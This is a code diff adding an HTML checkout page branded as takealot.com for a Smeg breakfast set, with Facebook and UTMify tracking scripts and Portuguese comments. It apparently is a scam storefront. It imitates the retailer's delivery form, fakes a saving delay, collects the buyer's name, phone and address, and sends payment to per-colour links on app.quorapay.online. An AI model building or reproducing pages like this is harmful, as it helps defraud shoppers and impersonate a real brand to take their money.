@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+  <!-- Facebook Pixel Code -->
+  <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)
+    }(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+
+    fbq('init', '1238580704010895');
+    fbq('track', 'PageView');
+    fbq('track', 'ViewContent');
+  </script>
+  <!-- End Facebook Pixel Code -->
+
+  <!-- UTMIFY SCRIPT -->
+  <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-xcod-sck
+    data-utmify-prevent-subids
+    async
+    defer
+  ></script>
+  <!-- END UTMIFY -->
+  <script>
+  window.pixelId = "69f3308425c7d3cc4f8da0a2";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Checkout - Delivery Details</title>
+
+<style>
+body{
+  margin:0;
+  font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial;
+  background:#fff;
+  color:#111;
+}
+
+/* TOPBAR COM LOGO */
+.topbar{
+  height:56px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  border-bottom:1px solid #eee;
+  position:sticky;
+  top:0;
+  background:#fff;
+  z-index:1000;
+}
+.logo-img{
+  height:28px;
+}
+
+.checkout{ padding:20px 16px; }
+.checkout h2{ font-size:22px; font-weight:800; margin-bottom:16px; }
+
+.type-tabs{ display:flex; gap:10px; margin-bottom:20px; }
+.tab{
+  flex:1;height:44px;border-radius:8px;
+  border:2px solid #1a73e8;background:#eaf3ff;
+  font-weight:700;color:#1a73e8;
+}
+
+.field{ margin-bottom:18px; }
+.field label{ font-size:13px;color:#666;display:block;margin-bottom:4px; }
+.field input{
+  width:100%;border:none;border-bottom:1px solid #ddd;
+  font-size:15px;padding:6px 0;outline:none;
+}
+
+.save-btn{
+  margin-top:30px;width:100%;height:48px;
+  border-radius:999px;border:none;
+  background:#0b6ecb;color:white;
+  font-size:16px;font-weight:800;
+  cursor:pointer;
+}
+.save-btn.loading{ opacity:.8; pointer-events:none; }
+.save-btn.saved{ background:#2ecc71; }
+
+#orderReview{
+  display:none;margin-top:24px;
+  border-top:1px solid #eee;padding-top:20px;
+}
+
+/* BOTÃO FINAL */
+.complete-btn{
+  margin-top:20px;
+  width:100%;
+  height:50px;
+  border-radius:999px;
+  border:none;
+  background:#00a651;
+  color:white;
+  font-size:16px;
+  font-weight:900;
+  cursor:pointer;
+  display:none;
+}
+.complete-btn:active{
+  transform: scale(0.98);
+}
+
+/* Province modal */
+.province-modal{
+  position:fixed;inset:0;
+  background:rgba(0,0,0,.4);
+  display:none;z-index:3000;
+}
+.province-modal.is-open{ display:block; }
+
+.province-sheet{
+  position:absolute;left:0;right:0;bottom:0;
+  background:#fff;border-radius:16px 16px 0 0;
+  max-height:80vh;overflow:auto;
+}
+.province-head{
+  text-align:center;font-size:18px;
+  font-weight:800;padding:14px;
+  border-bottom:1px solid #eee;
+}
+.province-item{
+  padding:16px;border-bottom:1px solid #eee;
+  font-size:16px;cursor:pointer;
+}
+.province-item:active{ background:#f2f2f2; }
+
+.product-summary{
+  display:flex;gap:12px;align-items:center;
+  border:1px solid #eee;border-radius:12px;
+  padding:12px;margin-bottom:20px;background:#fafafa;
+}
+.product-summary img{
+  width:68px;height:68px;object-fit:cover;
+  border-radius:8px;border:1px solid #eee;flex:0 0 auto;
+}
+.product-summary__info{ flex:1;min-width:0; }
+.product-summary__name{ font-size:13px;font-weight:700;color:#111;line-height:1.35; }
+.product-summary__color{
+  display:inline-flex;align-items:center;gap:6px;
+  margin-top:6px;font-size:12px;font-weight:600;color:#555;
+}
+.product-summary__dot{
+  width:14px;height:14px;border-radius:50%;
+  border:1px solid rgba(0,0,0,.15);flex:0 0 auto;
+}
+</style>
+</head>
+
+<body>
+
+<!-- TOPBAR COM LOGO -->
+<div class="topbar">
+  <img src="logo-takealot.svg" alt="takealot.com" class="logo-img">
+</div>
+
+<div class="checkout">
+
+<h2>Delivery Details</h2>
+
+<div class="product-summary">
+  <img id="summaryImg" src="p1.png" alt="Product">
+  <div class="product-summary__info">
+    <div class="product-summary__name">Smeg 3-Piece Breakfast Set 2-Slice Toaster, 1.7L Kettle &amp; Blender</div>
+    <div class="product-summary__color">
+      <span class="product-summary__dot" id="summaryDot"></span>
+      <span id="summaryColorName">Black</span>
+    </div>
+  </div>
+</div>
+
+<div class="type-tabs">
+  <button class="tab">Residential</button>
+</div>
+
+<div class="field"><label>Recipient Name</label><input id="fName"></div>
+<div class="field"><label>Recipient Mobile Number</label><input id="fPhone"></div>
+<div class="field"><label>Street Address</label><input id="fStreet"></div>
+<div class="field"><label>Complex / Building</label><input></div>
+<div class="field"><label>Suburb</label><input></div>
+<div class="field"><label>City / Town</label><input id="fCity"></div>
+
+<div class="field">
+  <label>Province</label>
+  <input id="provinceInput" placeholder="Select" readonly>
+</div>
+
+<div class="field"><label>Postal Code</label><input id="fPostal"></div>
+
+<button class="save-btn" id="openPayment">
+  <span id="saveText">Save</span>
+  <span id="saveLoader" style="display:none;">Saving...</span>
+  <span id="saveDone" style="display:none;">Saved ✓</span>
+</button>
+
+<!-- ORDER REVIEW -->
+<div id="orderReview">
+
+<h2>Order Review</h2>
+
+<strong>Delivery Method</strong><br>Delivery<br><br>
+
+<strong>Delivery Address</strong><br>
+<span style="background:#eee;padding:4px 10px;border-radius:20px;font-size:12px;font-weight:700;">RESIDENTIAL</span>
+
+<div id="orName" style="margin-top:8px;font-weight:700;"></div>
+<div id="orAddress" style="color:#555;"></div>
+<div style="color:#999;">
+  <span id="orPerson"></span> — <span id="orPhone"></span>
+</div>
+
+<br>
+<strong id="orDeliveryDate"></strong><br>
+Next Business Day Delivery • Free
+
+<br><br>
+<div style="display:flex;justify-content:space-between;">
+  <span style="color:#999;font-weight:700;">ITEMS FOR DELIVERY</span>
+</div>
+
+<div style="display:flex;gap:12px;margin-top:12px;align-items:center;">
+  <img id="reviewProductImg" src="p1.png" style="width:60px;height:60px;object-fit:contain;border:1px solid #eee;border-radius:6px;">
+  <div id="orProductName" style="font-size:14px;font-weight:700;">
+    Smeg 3-Piece Breakfast Set 2-Slice Toaster, 1.7L Kettle &amp; Blender - Black
+  </div>
+</div>
+
+<button class="complete-btn" id="completePurchase">
+  Complete the purchase
+</button>
+
+
+</div>
+
+</div>
+
+<!-- Province Modal -->
+<div class="province-modal" id="provinceModal">
+  <div class="province-sheet">
+    <div class="province-head">Province</div>
+    <div class="province-item">Eastern Cape</div>
+    <div class="province-item">Free State</div>
+    <div class="province-item">Gauteng</div>
+    <div class="province-item">KwaZulu-Natal</div>
+    <div class="province-item">Limpopo</div>
+    <div class="province-item">Mpumalanga</div>
+    <div class="province-item">Northern Cape</div>
+    <div class="province-item">North West</div>
+    <div class="province-item">Western Cape</div>
+  </div>
+</div>
+
+<script>
+// Cor vinda da página do produto via URL param
+const selectedColor = new URLSearchParams(window.location.search).get("color") || "Black";
+
+// Inicializa nome e imagem do produto com a cor recebida
+const colorFirstImg = {
+  "Black":       "p1.png",
+  "Cream":       "91eYg.jpg",
+  "Pastel Blue": "MV1XU.jpg",
+  "Pink":        "v40kB.jpg",
+  "Mint Green":  "WhatsApp Image 2026-06-11 at 00.57.51.jpeg",
+};
+const colorSwatchBg = {
+  "Black":       "#1a1a1a",
+  "Cream":       "#e8dcc8",
+  "Pastel Blue": "#a8d4e8",
+  "Pink":        "#f0a0b8",
+  "Mint Green":  "#8dd8c8",
+};
+const productImg    = colorFirstImg[selectedColor] || "p1.png";
+const reviewProductImg = document.getElementById("reviewProductImg");
+const orProductName    = document.getElementById("orProductName");
+const summaryImg       = document.getElementById("summaryImg");
+const summaryDot       = document.getElementById("summaryDot");
+const summaryColorName = document.getElementById("summaryColorName");
+
+if(reviewProductImg) reviewProductImg.src = productImg;
+if(orProductName)
+  orProductName.innerText =
+    "Smeg 3-Piece Breakfast Set 2-Slice Toaster, 1.7L Kettle & Blender - " + selectedColor;
+if(summaryImg) summaryImg.src = productImg;
+if(summaryDot) summaryDot.style.background = colorSwatchBg[selectedColor] || "#1a1a1a";
+if(summaryColorName) summaryColorName.innerText = selectedColor;
+
+// Province
+provinceInput.onclick = ()=> provinceModal.classList.add("is-open");
+
+document.querySelectorAll(".province-item").forEach(item=>{
+  item.onclick = ()=>{
+    provinceInput.value = item.innerText;
+    provinceModal.classList.remove("is-open");
+  }
+});
+
+provinceModal.onclick = e=>{
+  if(e.target === provinceModal)
+    provinceModal.classList.remove("is-open");
+}
+
+// Save + Review
+openPayment.onclick = ()=>{
+
+  openPayment.classList.add("loading");
+  saveText.style.display="none";
+  saveLoader.style.display="inline";
+
+  setTimeout(()=>{
+
+    saveLoader.style.display="none";
+    saveDone.style.display="inline";
+    openPayment.classList.remove("loading");
+    openPayment.classList.add("saved");
+
+    const name = fName.value;
+    const phone = fPhone.value;
+    const street = fStreet.value;
+    const city = fCity.value;
+    const postal = fPostal.value;
+    const prov = provinceInput.value;
+
+    orName.innerText = street || "Home";
+    orAddress.innerText = `${street}, ${city}, ${prov}, ${postal}`;
+    orPerson.innerText = name;
+    orPhone.innerText = phone;
+
+    const tomorrow = new Date();
+    tomorrow.setDate(tomorrow.getDate()+1);
+    const months=["January","February","March","April","May","June","July","August","September","October","November","December"];
+    orDeliveryDate.innerText =
+      `Delivery by ${tomorrow.getDate()} ${months[tomorrow.getMonth()]} ${tomorrow.getFullYear()}`;
+
+    orderReview.style.display="block";
+
+    // MOSTRAR BOTÃO FINAL
+    completePurchase.style.display = "block";
+
+    orderReview.scrollIntoView({behavior:"smooth"});
+
+  },3000);
+}
+const colorCheckoutURLs = {
+  "Black":       "https://app.quorapay.online/pay/0474ce64-e312-43a4-8145-a2984a17cc72",
+  "Cream":       "https://app.quorapay.online/pay/ffa4dfea-23c5-4a42-8343-cd18c722c59e",
+  "Pastel Blue": "https://app.quorapay.online/pay/3eba0a91-1374-45e1-b20d-96db5459a2c3",
+  "Pink":        "https://app.quorapay.online/pay/bcff871a-a127-4316-9d66-f1d6d5f2e630",
+  "Mint Green":  "https://app.quorapay.online/pay/1c47b769-547b-471a-ab23-c5fb2cd497bf",
+};
+
+completePurchase.onclick = () => {
+  const url = colorCheckoutURLs[selectedColor] || colorCheckoutURLs["Black"];
+  const params = window.location.search;
+
+  window.location.href = params ? url + params : url;
+};
+</script>
+
+</body>
+</html>
